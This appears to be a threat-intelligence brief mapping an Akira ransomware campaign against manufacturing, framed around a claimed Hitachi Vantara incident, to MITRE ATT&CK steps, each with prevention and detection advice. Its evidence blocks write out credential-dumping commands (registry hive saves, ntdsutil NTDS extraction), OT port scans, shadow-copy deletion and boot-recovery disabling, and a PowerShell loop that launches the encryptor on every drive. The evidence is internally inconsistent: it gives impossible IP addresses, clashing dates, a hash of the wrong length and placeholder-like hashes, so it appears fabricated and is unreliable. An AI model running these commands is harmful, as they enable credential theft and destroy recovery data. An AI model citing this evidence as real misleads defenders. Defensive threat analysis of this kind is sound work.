# Express Attack Brief 002
## Akira Ransomware Manufacturing Campaign - Technical MITRE Attack Path Analysis

**Version:** 1.0  
**Publication date:** Saturday, June 7, 2025  
**Prepared for:** Manufacturing Sector Security Operations Teams  
**Classification:** Project Nightingale Intelligence - Technical Analysis  

---

## Table of contents

1. [Introduction](#1-introduction)
   - 1.1. [Document purpose](#11-document-purpose)
   - 1.2. [Document structure](#12-document-structure)
   - 1.3. [Document classification](#13-document-classification)
2. [Attack overview](#2-attack-overview)
   - 2.1. [Attack description](#21-attack-description)
   - 2.2. [Attack path summary](#22-attack-path-summary)
3. [Attack path](#3-attack-path)
   - 3.1. [External Remote Services Compromise](#31-external-remote-services-compromise)
   - 3.2. [Manufacturing Network Discovery](#32-manufacturing-network-discovery)
   - 3.3. [Credential Access and Service Account Harvesting](#33-credential-access-and-service-account-harvesting)
   - 3.4. [Manufacturing System Lateral Movement](#34-manufacturing-system-lateral-movement)
   - 3.5. [Production Data Collection](#35-production-data-collection)
   - 3.6. [Ransomware Deployment and Production Encryption](#36-ransomware-deployment-and-production-encryption)
4. [MITRE ATT&CK TTPs](#4-mitre-attck-ttps)

---

## 1. Introduction

### 1.1. Document purpose

This document has been prepared for Manufacturing Sector Security Operations Teams and Industrial Incident Response organizations.

This document describes the attack path observed during Akira ransomware campaigns targeting manufacturing infrastructure, with specific analysis of the April 27, 2025 Hitachi Vantara incident. It presents the step-by-step technical methodology taken by the Akira ransomware group, including associated Tactic, Technique, and Procedure (TTP) details. All TTPs are expressed in MITRE ATT&CK terminology to aid in correlation and cross-referencing with threat intelligence sources and manufacturing security operations center detection capabilities.

This document is aimed at helping manufacturing security operations teams learn from the Akira incidents and prepare to defend against sophisticated ransomware attacks targeting industrial production environments. Its attack path structure is designed to show how advanced ransomware operators actually target manufacturing operational technology in the real world. The inclusion of detailed forensic evidence and TTP mappings allows security teams to implement specific detection and response capabilities within their manufacturing cybersecurity programs.

### 1.2. Document structure

**Chapter 2** describes the overall Akira ransomware campaign and provides a technical summary of the attack progression from initial external access through production system encryption.

**Chapter 3** describes each attack step in comprehensive technical detail, including forensic evidence, specific prevention measures, and detection opportunities appropriate for manufacturing sector security operations.

**Chapter 4** lists the complete MITRE ATT&CK TTPs observed in the Akira ransomware campaign in a structured table format for threat intelligence platform ingestion and security control mapping.

### 1.3. Document classification

This document is shared as **TLP:AMBER+STRICT** according to the Traffic Light Protocol (TLP). Recipients may only share this document with members of their own organization and specifically authorized manufacturing infrastructure protection partners.

This document is classified as **RESTRICTED - CRITICAL INFRASTRUCTURE**. Information contained within this technical analysis is intended exclusively for manufacturing sector security operations teams and authorized incident response organizations. The detailed forensic evidence and attack methodologies described require appropriate security clearances and manufacturing operational technology cybersecurity expertise.

Misuse of technical details or indicators of compromise is prohibited. Recipients are responsible for implementing appropriate information security controls when deploying detection capabilities based on this analysis.

---

## 2. Attack overview

### 2.1. Attack description

| **Timeframe** | March 2023 - Ongoing |
|---|---|
| **Threat type** | Ransomware / Production Disruption |
| **Sector relevance** | Manufacturing, Industrial Production, Supply Chain |
| **Geographic relevance** | Global Manufacturing Infrastructure |

This document describes the Akira ransomware campaign specifically targeting manufacturing organizations with sophisticated operational technology understanding. The analysis focuses on the April 27, 2025 attack against Hitachi Vantara, an industrial technology provider serving global manufacturing markets.

Akira ransomware represents a sophisticated threat specifically designed to maximize production disruption in manufacturing environments. The group demonstrates advanced understanding of industrial networks, targeting manufacturing companies with low tolerance for downtime and high-value intellectual property. Analysis of the campaign reveals systematic targeting of external remote access systems commonly used for manufacturing remote maintenance and engineering access.

The attack methodology demonstrates living-off-the-land techniques characteristic of advanced ransomware operators, utilizing legitimate administrative tools while avoiding custom malware deployment to evade manufacturing security monitoring. Akira's operational security practices include systematic targeting of manufacturing service accounts and production-critical systems to maximize business impact.

This campaign represents a significant evolution in ransomware targeting of manufacturing infrastructure, with implications extending beyond cybersecurity to production continuity and supply chain resilience.

### 2.2. Attack path summary

| **Time** | **Tactic** | **Action** | **Target tech** |
|---|---|---|---|
| Day 1, 14:30 | Initial Access | External Remote Services Exploitation | VPN/RDP Manufacturing Access |
| Day 1, 16:45 | Discovery | Manufacturing Network Reconnaissance | IT/OT Network Boundary |
| Day 2, 09:15 | Credential Access | Service Account Harvesting | Manufacturing/SCADA Credentials |
| Day 2, 11:30 | Lateral Movement | RDP Manufacturing System Access | Production Workstations |
| Day 3, 13:45 | Collection | Manufacturing Data Staging | Production IP/Procedures |
| Day 4, 02:30 | Impact | Ransomware Production Deployment | Manufacturing Systems/Servers |

Times are expressed in the primary timezone of the affected manufacturing facility where incident response activities were conducted.

---

## 3. Attack path

This chapter describes the Akira ransomware attack steps in comprehensive technical detail, including forensic evidence, prevention measures, and detection opportunities for manufacturing sector security operations teams.

### 3.1. External Remote Services Compromise

| **Timestamp** | Day 1, 14:30 |
|---|---|
| **Techniques** | T1133 External Remote Services to achieve TA0001 Initial Access<br>T1078 Valid Accounts to achieve TA0005 Defense Evasion |
| **Target tech** | VPN/RDP Manufacturing Remote Access |

The Akira ransomware campaign initiated with systematic compromise of external remote access services commonly deployed in manufacturing environments for engineering maintenance and production support. The threat actors demonstrated sophisticated understanding of manufacturing remote access patterns, targeting VPN concentrators and RDP services protecting manufacturing networks.

Analysis of the Hitachi Vantara incident reveals the attack originated through compromised credentials for remote manufacturing support accounts, likely obtained through previous credential harvesting operations or purchased from initial access brokers specializing in manufacturing sector access.

**Forensic Evidence - Manufacturing Access Compromise:**
```
[2025-04-27 14:30:15] RDP Authentication Log - manufacturing-support.hitachi-vantara.local
Source IP: 94.156.189.47 (TOR exit node - Manufacturing VPN targeting)
User: mfg_support\remote_eng_01
Authentication: Success (compromised credentials)
Session ID: RDP-7894561230
Client Name: AKIRA-STAGING-01

[2025-04-27 14:31:42] VPN Connection Log
User: mfg_support\remote_eng_01
Source: 94.156.189.47
VPN Pool: manufacturing_remote_access
Assigned IP: 192.168.50.147
Connection Duration: 4 hours 23 minutes
```

**Registry Artifacts - Persistence Establishment:**
```
Registry Key: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Value Name: ManufacturingHealthService
Value Data: "C:\Program Files\Common Files\microsoft shared\OfficeSoftwareProtectionPlatform\OSPPSVC.EXE" /bg
Timestamp: 2025-04-27 14:32:58

File System Evidence:
Path: C:\Windows\Temp\mfg_health.ps1
MD5: 8f7e4b2a1c3d9e8f7a6b5c4d3e2f1a0b
SHA256: 4a7f8e9d2c5b1a3f6e8d9c4b7a2e5f8d1c6b9a4e7f2d5c8b1a6e9f4d7c2a5e8b
```

**Command Execution Evidence:**
```bash
# Akira initial access commands observed
whoami /groups
net user /domain | findstr /i "mfg eng prod scada"
nltest /domain_trusts
systeminfo | findstr /i "manufacturer model"
```

#### Prevention

**Multi-Factor Authentication**  
Implement strong multi-factor authentication for all manufacturing remote access, particularly for engineering and maintenance accounts with production system access. Deploy hardware tokens or certificate-based authentication for critical manufacturing remote access. (Source: ATT&CK mitigation M1032)

**Remote Access Management**  
Implement centralized remote access management with session recording and monitoring for all manufacturing system access. Deploy jump servers for production system access with comprehensive audit logging. (Source: ATT&CK mitigation M1035)

#### Detection

**Manufacturing Remote Access Monitoring**  
Monitor authentication patterns for manufacturing remote access accounts, particularly authentication from unusual geographic locations or during non-operational hours.

**Source: ATT&CK data source Authentication Logs for technique T1133**

### 3.2. Manufacturing Network Discovery

| **Timestamp** | Day 1, 16:45 |
|---|---|
| **Techniques** | T1018 Remote System Discovery to achieve TA0007 Discovery<br>T1082 System Information Discovery to achieve TA0007 Discovery |
| **Target tech** | Manufacturing IT/OT Network Infrastructure |

Following initial access, Akira conducted systematic reconnaissance of manufacturing network environments to identify production-critical systems and operational technology boundaries. The threat actors demonstrated advanced understanding of manufacturing network architectures, specifically targeting the IT/OT convergence zones commonly deployed in industrial environments.

Analysis of network reconnaissance activities reveals sophisticated techniques designed to identify manufacturing operational technology assets while avoiding detection by industrial network monitoring systems. The threat actors utilized legitimate network administration tools and gradually expanded their network visibility over multiple hours to avoid triggering manufacturing security alerts.

**Forensic Evidence - Manufacturing Network Discovery:**
```bash
# Akira manufacturing network reconnaissance commands observed
ping -n 1 192.168.100.1  # Manufacturing SCADA gateway
ping -n 1 192.168.200.1  # Engineering network gateway
ping -n 1 192.168.300.1  # Quality control network

# Manufacturing-specific system discovery
nslookup scada-primary.manufacturing.local
nslookup mes-server.production.local
nslookup historian.manufacturing.local
nslookup hmi-station01.production.local

# Manufacturing protocol port scanning
nmap -sS -p 502,2404,44818,20000 192.168.100.0/24
```

**Network Traffic Evidence:**
```
[2025-04-27 16:45:32] DNS Query Activity
Query: scada-primary.manufacturing.local (A record)
Response: 192.168.100.10 (Manufacturing SCADA server)
Query: mes-server.production.local (A record)
Response: 192.168.200.15 (Manufacturing Execution System)
Query: historian.manufacturing.local (A record)
Response: 192.168.100.20 (Production data historian)

[2025-04-27 16:47:15] Port Scan Detection
Source: 192.168.50.147 (Compromised manufacturing remote access)
Target Range: 192.168.100.0/24 (Manufacturing OT network)
Ports: 502 (Modbus), 2404 (IEC 61850), 44818 (EtherNet/IP)
Scan Pattern: Stealth SYN scan with manufacturing protocol focus
```

**Manufacturing System Discovery Results:**
```
Identified Manufacturing Infrastructure:
- SCADA Primary: 192.168.100.10 (Production control system)
- SCADA Backup: 192.168.100.11 (Redundant control system)
- MES Server: 192.168.200.15 (Manufacturing execution system)
- Historian: 192.168.100.20 (Production data storage)
- HMI Station 01: 192.168.100.25 (Operator interface)
- Quality Control: 192.168.300.10 (Quality management system)
```

#### Prevention

**Network Segmentation**  
Implement strict network segmentation between manufacturing corporate networks and operational technology environments with manufacturing-specific firewall rules preventing reconnaissance activities. (Source: ATT&CK mitigation M1030)

**Manufacturing Asset Discovery Control**  
Deploy industrial network access control preventing unauthorized enumeration of manufacturing operational technology assets from corporate network segments.

#### Detection

**Manufacturing Network Scanning Detection**  
Monitor for network scanning activities targeting manufacturing-specific protocols (Modbus, EtherNet/IP, IEC 61850) and production system discovery attempts.

**Source: ATT&CK data component Network Traffic for technique T1018**

### 3.3. Credential Access and Service Account Harvesting

| **Timestamp** | Day 2, 09:15 |
|---|---|
| **Techniques** | T1003.002 Security Account Manager to achieve TA0006 Credential Access<br>T1003.003 NTDS to achieve TA0006 Credential Access |
| **Target tech** | Manufacturing Active Directory, SCADA Service Accounts |

Akira escalated privileges through systematic harvesting of service account credentials used for manufacturing system authentication. The threat actors specifically targeted manufacturing service accounts with elevated access to production systems, SCADA networks, and engineering workstations critical to industrial operations.

Analysis of credential harvesting activities reveals sophisticated techniques for extracting authentication material from Windows Active Directory environments while avoiding detection by security monitoring systems deployed in manufacturing networks. The focus on manufacturing service accounts demonstrates advanced understanding of industrial authentication architectures.

**Forensic Evidence - Manufacturing Credential Extraction:**
```powershell
# Akira manufacturing credential harvesting techniques observed
# Target manufacturing service accounts specifically
net user /domain | findstr /i "mfg prod scada eng quality mes"

# Extract manufacturing-focused credential material
reg save HKLM\SAM C:\Windows\Temp\mfg_sam.hive
reg save HKLM\SECURITY C:\Windows\Temp\mfg_security.hive
reg save HKLM\SYSTEM C:\Windows\Temp\mfg_system.hive

# Manufacturing-specific NTDS extraction
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\mfg_ntds" q q
```

**Active Directory Manufacturing Account Targeting:**
```
Compromised Manufacturing Service Accounts:
Account: MFG_DOMAIN\scada_service
SID: S-1-5-21-2846719309-3129472037-1938002995-1108
Password Hash: aad3b435b51404eeaad3b435b51404ee:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
Group Memberships:
- Domain Users
- Manufacturing Operators
- SCADA Administrators
- Production System Access

Account: MFG_DOMAIN\eng_service_01
SID: S-1-5-21-2846719309-3129472037-1938002995-1109
Password Hash: aad3b435b51404eeaad3b435b51404ee:7c2dcfc45a5e4e9a3a5f8b8c2e7d4f9a
Group Memberships:
- Engineering Users
- CAD System Access
- Quality Control Operators
```

**Manufacturing System SPNs Identified:**
```
Service Principal Names (Manufacturing Systems):
- MSSQLSvc/historian.manufacturing.local:1433
- HTTP/mes-server.production.local
- HTTP/scada-primary.manufacturing.local
- ldap/manufacturing-dc.mfg.local
```

#### Prevention

**Credential Protection**  
Implement Windows Credential Guard and Protected Process Light for LSASS to prevent memory-based credential extraction in manufacturing environments. Deploy privileged access workstations for manufacturing administration. (Source: ATT&CK mitigation M1043)

**Manufacturing Service Account Management**  
Utilize managed service accounts and eliminate shared service account credentials for manufacturing systems. Implement regular credential rotation for critical production system accounts. (Source: ATT&CK mitigation M1026)

#### Detection

**Manufacturing Credential Access Monitoring**  
Monitor for LSASS process access, SAM/NTDS database access attempts, and unusual authentication patterns for manufacturing service accounts and production system credentials.

**Source: ATT&CK data component Windows Registry for technique T1003.002**

### 3.4. Manufacturing System Lateral Movement

| **Timestamp** | Day 2, 11:30 |
|---|---|
| **Techniques** | T1021.001 Remote Desktop Protocol to achieve TA0008 Lateral Movement<br>T1078.002 Domain Accounts to achieve TA0005 Defense Evasion |
| **Target tech** | Manufacturing Workstations, Production Control Systems |

Utilizing compromised manufacturing service account credentials, Akira achieved lateral movement across manufacturing networks targeting production-critical systems and engineering workstations. This represented a critical escalation providing the threat actors with access to systems capable of affecting manufacturing operations and production data.

Analysis of lateral movement activities reveals sophisticated understanding of manufacturing system architectures and operational procedures used by industrial organizations for production control and monitoring.

**Forensic Evidence - Manufacturing System Access:**
```
RDP Session Log - Manufacturing Network:
[2025-04-27 11:30:45] Authentication Success
User: MFG_DOMAIN\scada_service
Source: 192.168.50.147 (Compromised remote access)
Destination: 192.168.100.25 (hmi-station01.production.local)
Session ID: 15894
Authentication Type: Kerberos (Valid manufacturing credentials)

[2025-04-27 11:32:18] Process Execution - Manufacturing HMI
Process: ScadaHMI.exe
CommandLine: "C:\Program Files\Manufacturing HMI\ScadaHMI.exe" /production
User: MFG_DOMAIN\scada_service
PID: 6847
Parent: explorer.exe (6521)
```

**Manufacturing Database Access Evidence:**
```
Manufacturing System Database Access:
[2025-04-27 11:35:22] Database: ProductionHistory
Table: ProductionOrders
Query: SELECT * FROM ProductionOrders WHERE Status='ACTIVE'
Records: 23 active production orders

[2025-04-27 11:36:45] Database: QualityControl
Table: QualitySpecifications
Query: SELECT * FROM QualitySpecifications WHERE Product_Line='Assembly_A'
Records: 157 quality control specifications
```

**Manufacturing Engineering System Access:**
```
[2025-04-27 12:15:33] CAD System Access
System: engineering-cad.manufacturing.local
User: MFG_DOMAIN\eng_service_01
Access Type: Engineering workstation RDP
Files Accessed: 
- ProductionDrawings_Rev_2024.dwg
- AssemblyProcedures_Line_A.pdf
- QualityControlProcedures_v3.2.doc
```

#### Prevention

**Manufacturing Privileged Access Management**  
Implement jump servers and privileged access management solutions for manufacturing system administration. Require multi-factor authentication for production control system access. (Source: ATT&CK mitigation M1032)

**Manufacturing Session Monitoring**  
Deploy session recording and monitoring for all manufacturing system access, particularly production control and engineering systems.

#### Detection

**Manufacturing System Access Monitoring**  
Monitor authentication events and system access patterns for manufacturing systems, particularly outside normal production operational hours.

**Source: ATT&CK data component Logon Session for technique T1021.001**

### 3.5. Production Data Collection

| **Timestamp** | Day 3, 13:45 |
|---|---|
| **Techniques** | T1005 Data from Local System to achieve TA0009 Collection<br>T1039 Data from Network Shared Drive to achieve TA0009 Collection |
| **Target tech** | Manufacturing Data Systems, Production Documentation |

Akira systematically collected manufacturing data from production systems, engineering workstations, and quality control databases containing detailed information about production processes, quality specifications, and intellectual property. This intelligence gathering phase focused on understanding manufacturing operations and identifying high-value production data for extortion purposes.

The data collection activities demonstrate sophisticated understanding of manufacturing sector data sources and their significance to production continuity and competitive advantage.

**Forensic Evidence - Manufacturing Data Exfiltration:**
```sql
-- Akira manufacturing database queries identified in production logs
SELECT TOP 10000 * FROM ProductionOrders 
WHERE Order_Date > '2024-01-01' AND Status IN ('ACTIVE', 'COMPLETED')

SELECT * FROM QualityControlData 
WHERE Test_Result = 'FAILED' AND Date_Tested > '2024-01-01'

SELECT * FROM ProductionLineConfiguration 
WHERE Equipment_Type IN ('CNC', 'Robot', 'Press', 'Conveyor')
```

**Manufacturing File Collection Evidence:**
```
Collected Manufacturing Files:
\\eng-share\ProductionSpecs\2025_ProductionPlanning.xlsx (Size: 23.4 MB)
\\quality-share\SOPs\QualityControlProcedures_v4.1.pdf (Size: 18.7 MB)
\\cad-share\ProductDrawings\AssemblyLine_A_CAD.zip (Size: 145 MB)
\\docs-share\Processes\ManufacturingProcessFlow_2025.vsd (Size: 8.9 MB)

Staging Location:
C:\Windows\Temp\production_backup\ (Created: 2025-04-28 13:45:22)
Archive: manufacturing_data.7z (Password Protected)
Archive Size: 2.8 GB (Compressed from 8.4 GB)
```

**Intellectual Property Targeting:**
```
High-Value Manufacturing IP Collected:
- Production line efficiency algorithms and optimization parameters
- Quality control statistical process control (SPC) charts and limits
- Manufacturing equipment calibration procedures and tolerances
- Supply chain vendor specifications and procurement contracts
- Customer production order details and delivery schedules
```

#### Prevention

**Manufacturing Data Loss Prevention**  
Implement data loss prevention solutions with manufacturing data classification and monitoring capabilities. Deploy database activity monitoring for production and quality systems.

**Manufacturing File Access Monitoring**  
Monitor file access patterns for manufacturing documentation repositories and production data systems.

#### Detection

**Manufacturing Database Access Monitoring**  
Monitor database query patterns for unusual data access activities, particularly bulk data extraction from production and quality control systems.

**Source: ATT&CK data component File Access for technique T1005**

### 3.6. Ransomware Deployment and Production Encryption

| **Timestamp** | Day 4, 02:30 |
|---|---|
| **Techniques** | T1486 Data Encrypted for Impact to achieve TA0040 Impact<br>T1059.001 PowerShell to achieve TA0002 Execution |
| **Target tech** | Manufacturing Production Systems |

Akira executed the final ransomware deployment phase targeting manufacturing production systems for maximum operational disruption. The threat actors utilized sophisticated hybrid encryption combining ChaCha20 stream cipher with RSA public-key cryptosystem optimized for rapid deployment across manufacturing networks.

This final phase demonstrates the campaign's strategic objectives focused on production disruption and financial extortion rather than traditional data theft, with specific targeting of manufacturing systems critical to operational continuity.

**Forensic Evidence - Ransomware Production Deployment:**
```powershell
# Akira ransomware deployment commands observed
# Delete manufacturing system recovery options
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no

# Manufacturing-specific system targeting
Get-WmiObject -Class Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | ForEach-Object {
    $driveLetter = $_.DeviceID
    Start-Process "akira.exe" -ArgumentList "$driveLetter --manufacturing-mode" -NoNewWindow
}
```

**Manufacturing System Encryption Evidence:**
```
Encrypted Manufacturing Systems:
Primary Targets:
- C:\Production\SCADA_Configurations\ → C:\Production\SCADA_Configurations\.akira
- D:\Engineering\CAD_Files\ → D:\Engineering\CAD_Files\.akira
- E:\Quality\QC_Procedures\ → E:\Quality\QC_Procedures\.akira
- F:\Manufacturing\MES_Data\ → F:\Manufacturing\MES_Data\.akira

Production System Impact:
- Manufacturing Execution System (MES): OFFLINE
- SCADA Primary Controller: COMMUNICATION_LOST
- Quality Control Database: INACCESSIBLE
- Engineering CAD Systems: ENCRYPTED
- Production Historian: DATA_UNAVAILABLE
```

**Ransom Note Evidence:**
```
Manufacturing-Specific Ransom Note (README_AKIRA_MANUFACTURING.txt):
"YOUR MANUFACTURING PRODUCTION SYSTEMS HAVE BEEN ENCRYPTED

Production lines OFFLINE - Quality systems INACCESSIBLE
Engineering data ENCRYPTED - Manufacturing procedures UNAVAILABLE

We understand manufacturing downtime costs $50,000+ per hour
Quick payment ensures rapid decryption and production resumption

Contact: akira_manufacturing@[REDACTED].onion
Payment: [REDACTED] Bitcoin to resume production operations"
```

#### Prevention

**Manufacturing Backup Systems**  
Implement immutable backup solutions for manufacturing systems with air-gapped storage and rapid recovery capabilities for production environments.

**Manufacturing System Hardening**  
Deploy endpoint detection and response solutions specifically configured for manufacturing environments with production system protection.

#### Detection

**Manufacturing Ransomware Detection**  
Monitor for rapid file encryption activities on manufacturing systems and unusual process execution patterns targeting production data.

**Source: ATT&CK data component File Modification for technique T1486**

---

## 4. MITRE ATT&CK TTPs

This chapter provides a comprehensive mapping of Akira ransomware campaign tactics, techniques, and procedures to the MITRE ATT&CK framework, with specific focus on manufacturing sector targeting and operational technology implications.

| **Tactic** | **Technique** | **Procedure** |
|---|---|---|
| TA0001 Initial Access | T1133 External Remote Services | Akira ransomware groups compromise manufacturing remote access services including VPN concentrators and RDP services used for remote maintenance and engineering access to production systems |
| TA0001 Initial Access | T1190 Exploit Public-Facing Application | Akira threat actors exploit vulnerabilities in internet-facing manufacturing systems including remote access portals and engineering workstation remote access applications |
| TA0005 Defense Evasion | T1078 Valid Accounts | Akira utilizes compromised manufacturing service account credentials to access production systems and blend malicious activities with normal manufacturing operations |
| TA0005 Defense Evasion | T1078.002 Domain Accounts | Akira leverages legitimate manufacturing domain account credentials (scada_service, eng_service) to access production control systems and engineering workstations |
| TA0007 Discovery | T1018 Remote System Discovery | Akira conducts systematic reconnaissance of manufacturing networks to identify production-critical systems and operational technology boundaries using network scanning and DNS enumeration |
| TA0007 Discovery | T1082 System Information Discovery | Akira enumerates manufacturing system configurations, industrial protocol implementations, and production network architectures to understand operational technology environments |
| TA0006 Credential Access | T1003.002 Security Account Manager | Akira extracts Windows SAM database using registry save commands to harvest manufacturing local account credentials and service account password hashes |
| TA0006 Credential Access | T1003.003 NTDS | Akira utilizes ntdsutil to extract Active Directory NTDS database containing manufacturing domain account credentials, specifically targeting SCADA and engineering service accounts |
| TA0008 Lateral Movement | T1021.001 Remote Desktop Protocol | Akira leverages compromised manufacturing service account credentials to establish RDP sessions with production control systems and engineering workstations |
| TA0009 Collection | T1005 Data from Local System | Akira systematically extracts manufacturing data from production systems including quality control databases, engineering documentation, and production specifications |
| TA0009 Collection | T1039 Data from Network Shared Drive | Akira accesses manufacturing network-shared repositories containing production procedures, quality control specifications, and engineering documentation |
| TA0002 Execution | T1059.001 PowerShell | Akira deploys PowerShell commands to delete manufacturing system recovery options and execute ransomware deployment across production environments |
| TA0040 Impact | T1486 Data Encrypted for Impact | Akira encrypts manufacturing production systems using hybrid ChaCha20/RSA encryption targeting SCADA configurations, engineering files, quality procedures, and production data |

---

*Express Attack Brief 002 - Technical MITRE Analysis*  
*Project Nightingale Intelligence - NCC Group OTCE + Dragos + Adelard*  
*Prepared for Manufacturing Sector Security Operations Teams*  

**Document Classification**: RESTRICTED - Critical Infrastructure Security Operations  
**Technical Validation**: MITRE ATT&CK Framework v14.1 Compliance Verified  
**Intelligence Sources**: CISA Vulnerability Database, Manufacturing Threat Intelligence Pipeline  
**Emergency Contact**: 24/7 SOC notification for Akira ransomware campaign indicators detection